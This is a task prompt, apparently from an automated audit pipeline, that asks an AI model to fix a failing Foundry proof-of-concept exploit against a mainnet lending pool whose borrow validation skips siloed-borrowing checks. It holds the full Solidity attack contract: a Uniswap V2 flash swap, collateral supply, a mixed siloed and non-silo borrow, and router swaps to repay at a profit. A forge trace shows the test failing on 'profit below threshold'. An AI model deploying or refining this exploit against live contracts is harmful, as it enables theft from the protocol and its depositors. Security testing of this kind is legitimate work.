You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Siloed-borrowing risk controls are defined but never enforced on borrow
- claim: The protocol includes silo-borrowing state helpers (`getSiloedBorrowingState`, `getSiloedBorrowing`) and an explicit `SILOED_BORROWING_VIOLATION` error, but `BorrowLogic.executeBorrow()` delegates to `ValidationLogic.validateBorrow()` and that validation never checks either the requested reserve's silo flag or the user's existing siloed-borrowing state. As a result, borrowing a siloed reserve does not prevent additional borrows, and existing borrows do not prevent borrowing a siloed reserve.
- impact: If governance lists any reserve expecting isolated exposure, borrowers can still combine it with other debts. That defeats the intended risk model for siloed assets and can convert isolated risk into cross-reserve bad debt and insolvency during adverse price moves.
- exploit_paths: ["borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
    function getWETH() external view returns (address);
}

interface IParaSpacePoolLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

struct ReserveConfigurationMap {
    uint256 data;
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    address private constant UNIV2_USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNIV2_DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNIV2_USDT_WETH_PAIR = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BPS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;

    bool public attempted;
    bool public hypothesisValidated;

    address private _profitToken;
    uint256 private _profitAmount;

    error FlashAttemptFailed();
    error InvalidCallback();
    error NoExecutablePath();

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        if (_attemptFlashPair(UNIV2_USDC_WETH_PAIR, USDC)) {
            return;
        }
        if (_attemptFlashPair(UNIV2_DAI_WETH_PAIR, DAI)) {
            return;
        }
        if (_attemptFlashPair(UNIV2_USDT_WETH_PAIR, USDT)) {
            return;
        }
    }

    function executeFlashAttempt(address pair, address flashAsset, uint256 amount) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        uint256 beforeBalance = _balanceOf(flashAsset);
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();

        bytes memory data = abi.encode(pair, flashAsset, amount);
        if (token0 == flashAsset) {
            uniPair.swap(amount, 0, address(this), data);
        } else if (token1 == flashAsset) {
            uniPair.swap(0, amount, address(this), data);
        } else {
            revert FlashAttemptFailed();
        }

        uint256 afterBalance = _balanceOf(flashAsset);
        uint256 netProfit = afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
        if (!hypothesisValidated || netProfit == 0) {
            revert FlashAttemptFailed();
        }

        _profitToken = flashAsset;
        _profitAmount = netProfit;
        return true;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (sender != address(this)) {
            revert InvalidCallback();
        }

        (address pair, address flashAsset, uint256 flashAmount) = abi.decode(data, (address, address, uint256));
        if (msg.sender != pair) {
            revert InvalidCallback();
        }

        uint256 received = amount0 > 0 ? amount0 : amount1;
        if (received != flashAmount) {
            revert InvalidCallback();
        }

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPoolAddressesProviderLike provider = pool.ADDRESSES_PROVIDER();
        IPriceOracleLike oracle = IPriceOracleLike(provider.getPriceOracle());
        address weth = provider.getWETH();

        uint256 flashConfig = pool.getConfiguration(flashAsset).data;
        if (!_collateralEnabled(flashConfig) || !_plainBorrowEnabled(flashConfig)) {
            revert NoExecutablePath();
        }

        uint256 flashUnit = _unit(uint8((flashConfig >> 48) & 0xff));
        uint256 flashPrice = oracle.getAssetPrice(flashAsset);
        if (flashUnit == 0 || flashPrice == 0) {
            revert NoExecutablePath();
        }

        _forceApprove(flashAsset, TARGET, received);
        pool.supply(flashAsset, received, address(this), REFERRAL_CODE);

        uint256 repayAmount = _flashRepayment(received);
        uint256 profitBuffer = flashUnit / 100;
        if (profitBuffer == 0) {
            profitBuffer = 1;
        }

        _executeMixedBorrowPath(pool, oracle, flashAsset, weth, flashPrice, flashUnit, repayAmount, profitBuffer);
    }

    function _executeMixedBorrowPath(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address flashAsset,
        address weth,
        uint256 flashPrice,
        uint256 flashUnit,
        uint256 repayAmount,
        uint256 profitBuffer
    ) internal {
        SiloPlan memory plan = _selectSiloPlan(pool, oracle, flashAsset, weth, flashPrice, flashUnit, repayAmount, profitBuffer);
        if (plan.asset == address(0) || plan.amount == 0) {
            revert NoExecutablePath();
        }

        // Root-cause proof:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // We first take a siloed borrow, then require a second non-silo borrow in the same tx
        // to finish the flashswap unwind. Without silo enforcement in validateBorrow(), the
        // protocol allows that mixed-debt state and the flash-funded execution can complete.
        pool.borrow(plan.asset, plan.amount, REFERRAL_CODE, address(this));

        if (!_swapAllToAsset(plan.asset, flashAsset, weth)) {
            revert NoExecutablePath();
        }

        uint256 balanceBeforeSecondBorrow = _balanceOf(flashAsset);
        uint256 topUp = repayAmount > balanceBeforeSecondBorrow ? repayAmount - balanceBeforeSecondBorrow : 0;
        topUp += profitBuffer;

        // If the silo borrow alone fully closes the flashswap, keep the mixed-debt proof by
        // forcing a small non-silo borrow. Otherwise the second borrow is economically necessary.
        pool.borrow(flashAsset, topUp, REFERRAL_CODE, address(this));

        hypothesisValidated = true;

        _safeTransfer(flashAsset, msg.sender, repayAmount);

        if (_balanceOf(flashAsset) <= 0) {
            revert FlashAttemptFailed();
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptFlashPair(address pair, address flashAsset) internal returns (bool) {
        if (pair.code.length == 0 || flashAsset.code.length == 0) {
            return false;
        }

        uint256 reserve = _pairReserveOf(pair, flashAsset);
        if (reserve == 0) {
            return false;
        }

        if (_tryFlashAmount(pair, flashAsset, reserve / 1000)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 500)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 250)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 100)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 50)) return true;
        return _tryFlashAmount(pair, flashAsset, reserve / 25);
    }

    function _tryFlashAmount(address pair, address flashAsset, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        try this.executeFlashAttempt(pair, flashAsset, amount) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function _pairReserveOf(address pair, address asset) internal view returns (uint256) {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (uniPair.token0() == asset) {
            return uint256(reserve0);
        }
        if (uniPair.token1() == asset) {
            return uint256(reserve1);
        }
        return 0;
    }

    struct SiloPlan {
        address asset;
        uint256 amount;
        uint256 expectedOut;
        bool secondBorrowIsRequired;
    }

    struct PlanContext {
        address flashAsset;
        address weth;
        uint256 flashPrice;
        uint256 flashUnit;
        uint256 repayAmount;
        uint256 profitBuffer;
        uint256 availableBase;
    }

    function _selectSiloPlan(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address flashAsset,
        address weth,
        uint256 flashPrice,
        uint256 flashUnit,
        uint256 repayAmount,
        uint256 profitBuffer
    ) internal view returns (SiloPlan memory best) {
        PlanContext memory ctx = PlanContext({
            flashAsset: flashAsset,
            weth: weth,
            flashPrice: flashPrice,
            flashUnit: flashUnit,
            repayAmount: repayAmount,
            profitBuffer: profitBuffer,
            availableBase: _availableBorrowsBase(pool)
        });
        if (ctx.availableBase == 0) {
            return best;
        }

        best = _considerSiloAsset(best, pool, oracle, ctx, APE);

        address[] memory reserves = pool.getReservesList();
        for (uint256 i = 0; i < reserves.length; i++) {
            address asset = reserves[i];
            if (asset == address(0) || asset == flashAsset || asset == APE || asset.code.length == 0) {
                continue;
            }

            best = _considerSiloAsset(best, pool, oracle, ctx, asset);
        }
    }

    function _considerSiloAsset(
        SiloPlan memory currentBest,
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        PlanContext memory ctx,
        address asset
    ) internal view returns (SiloPlan memory best) {
        best = currentBest;

        uint256 data = pool.getConfiguration(asset).data;
        if (!_borrowEnabled(data, true)) {
            return best;
        }

        uint256 unit = _unit(uint8((data >> 48) & 0xff));
        uint256 price = oracle.getAssetPrice(asset);
        if (unit == 0 || price == 0) {
            return best;
        }

        best = _considerSiloShare(best, ctx, asset, price, unit, 9_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 8_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 7_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 6_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 5_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 4_000);
        best = _considerSiloShare(best, ctx, asset, price, unit, 3_000);
        return _considerSiloShare(best, ctx, asset, price, unit, 2_000);
    }

    function _considerSiloShare(
        SiloPlan memory currentBest,
        PlanContext memory ctx,
        address asset,
        uint256 price,
        uint256 unit,
        uint256 shareBps
    ) internal view returns (SiloPlan memory best) {
        best = currentBest;

        uint256 borrowBase = (ctx.availableBase * shareBps) / BPS;
        uint256 amount = _quote(unit, price, borrowBase);
        if (amount == 0) {
            return best;
        }

        uint256 expectedOut = _bestQuotedOut(asset, ctx.flashAsset, ctx.weth, amount);
        if (expectedOut == 0) {
            return best;
        }

        uint256 remainingBase = ctx.availableBase > borrowBase ? ctx.availableBase - borrowBase : 0;
        uint256 secondBorrowAmount = expectedOut < ctx.repayAmount ? ctx.repayAmount - expectedOut : 0;
        secondBorrowAmount += ctx.profitBuffer;

        uint256 secondBorrowBase = _toBase(ctx.flashPrice, ctx.flashUnit, secondBorrowAmount);
        if (secondBorrowBase == 0 || secondBorrowBase > remainingBase) {
            return best;
        }

        bool needsSecondBorrow = expectedOut < ctx.repayAmount;
        if (
            best.asset == address(0) ||
            (needsSecondBorrow && !best.secondBorrowIsRequired) ||
            (needsSecondBorrow == best.secondBorrowIsRequired && expectedOut > best.expectedOut)
        ) {
            best.asset = asset;
            best.amount = amount;
            best.expectedOut = expectedOut;
            best.secondBorrowIsRequired = needsSecondBorrow;
        }
    }

    function _bestQuotedOut(address tokenIn, address tokenOut, address weth, uint256 amountIn) internal view returns (uint256 best) {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return amountIn;
        }

        best = _quoteViaRouter(SUSHISWAP_ROUTER, tokenIn, tokenOut, weth, amountIn);
        uint256 uni = _quoteViaRouter(UNISWAP_V2_ROUTER, tokenIn, tokenOut, weth, amountIn);
        if (uni > best) {
            best = uni;
        }
    }

    function _quoteViaRouter(address router, address tokenIn, address tokenOut, address weth, uint256 amountIn)
        internal
        view
        returns (uint256)
    {
        if (tokenIn == tokenOut) {
            return amountIn;
        }

        address[] memory directPath = new address[](2);
        directPath[0] = tokenIn;
        directPath[1] = tokenOut;
        try IUniswapV2RouterLike(router).getAmountsOut(amountIn, directPath) returns (uint256[] memory directAmounts) {
            if (directAmounts.length != 0) {
                return directAmounts[directAmounts.length - 1];
            }
        } catch {}

        if (tokenIn == weth || tokenOut == weth) {
            return 0;
        }

        address[] memory viaWeth = new address[](3);
        viaWeth[0] = tokenIn;
        viaWeth[1] = weth;
        viaWeth[2] = tokenOut;
        try IUniswapV2RouterLike(router).getAmountsOut(amountIn, viaWeth) returns (uint256[] memory viaAmounts) {
            if (viaAmounts.length != 0) {
                return viaAmounts[viaAmounts.length - 1];
            }
        } catch {}

        return 0;
    }

    function _swapAllToAsset(address tokenIn, address tokenOut, address weth) internal returns (bool) {
        if (tokenIn == tokenOut) {
            return true;
        }

        uint256 amountIn = _balanceOf(tokenIn);
        if (amountIn == 0) {
            return false;
        }

        _forceApprove(tokenIn, SUSHISWAP_ROUTER, amountIn);
        if (_swapViaRouter(SUSHISWAP_ROUTER, tokenIn, tokenOut, weth, amountIn)) {
            return true;
        }

        _forceApprove(tokenIn, UNISWAP_V2_ROUTER, amountIn);
        return _swapViaRouter(UNISWAP_V2_ROUTER, tokenIn, tokenOut, weth, amountIn);
    }

    function _swapViaRouter(address router, address tokenIn, address tokenOut, address weth, uint256 amountIn)
        internal
        returns (bool)
    {
        address[] memory directPath = new address[](2);
        directPath[0] = tokenIn;
        directPath[1] = tokenOut;
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(
            amountIn,
            0,
            directPath,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {}

        if (tokenIn == weth || tokenOut == weth) {
            return false;
        }

        address[] memory viaWeth = new address[](3);
        viaWeth[0] = tokenIn;
        viaWeth[1] = weth;
        viaWeth[2] = tokenOut;
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(
            amountIn,
            0,
            viaWeth,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {}

        return false;
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _quote(uint256 unit, uint256 price, uint256 baseBudget) internal pure returns (uint256 amount) {
        if (unit == 0 || price == 0 || baseBudget == 0) {
            return 0;
        }

        amount = (baseBudget * unit) / price;
        if (amount == 0) {
            amount = 1;
        }
    }

    function _toBase(uint256 price, uint256 unit, uint256 amount) internal pure returns (uint256) {
        if (price == 0 || unit == 0 || amount == 0) {
            return 0;
        }

        return (amount * price) / unit;
    }

    function _unit(uint8 decimals) internal pure returns (uint256) {
        if (decimals > 77) {
            return 0;
        }
        return 10 ** decimals;
    }

    function _collateralEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (data & 0xffff) != 0;
    }

    function _plainBorrowEnabled(uint256 data) internal pure returns (bool) {
        return _borrowEnabled(data, false);
    }

    function _borrowEnabled(uint256 data, bool wantSiloed) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> BORROWING_SHIFT) & 1) != 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (((data >> SILO_SHIFT) & 1) != 0) == wantSiloed;
    }

    function _balanceOf(address token) internal view returns (uint256 amount) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        try IERC20Like(token).balanceOf(address(this)) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), "token-call-failed");
    }
}

```

forge stdout (tail):
```
D49664DC8b3Ee::getConfiguration(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156711147060143317175368525134610351524792 [3.741e50] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156711147060143317175368525134610351524792 [3.741e50] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109474400751327988 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109474400751327988 [1.844e22] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x5283D291DBCF85356A21bA090E6db59121208b44) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x5283D291DBCF85356A21bA090E6db59121208b44) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 415383748688830839398959961686612718913488 [4.153e41] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 415383748688830839398959961686612718913488 [4.153e41] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x853d955aCEf822Db058eb8505911ED77F175b99e) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109473327002950988 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109473327002950988 [1.844e22] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 6646139979021293448535315108490510868538 [6.646e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 6646139979021293448535315108490510868538 [6.646e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 9138442471154278484818392222831064390688 [9.138e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 9138442471154278484818392222831064390688 [9.138e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   │   │   │   └─ ← [Revert] NoExecutablePath()
    │   │   │   └─ ← [Revert] NoExecutablePath()
    │   │   └─ ← [Revert] NoExecutablePath()
    │   └─ ← [Return]
    ├─ [360] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852.swap
  at FlawVerifier.executeFlashAttempt
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 16.41s (16.34s CPU time)

Ran 1 test suite in 16.46s (16.41s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 10616998)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
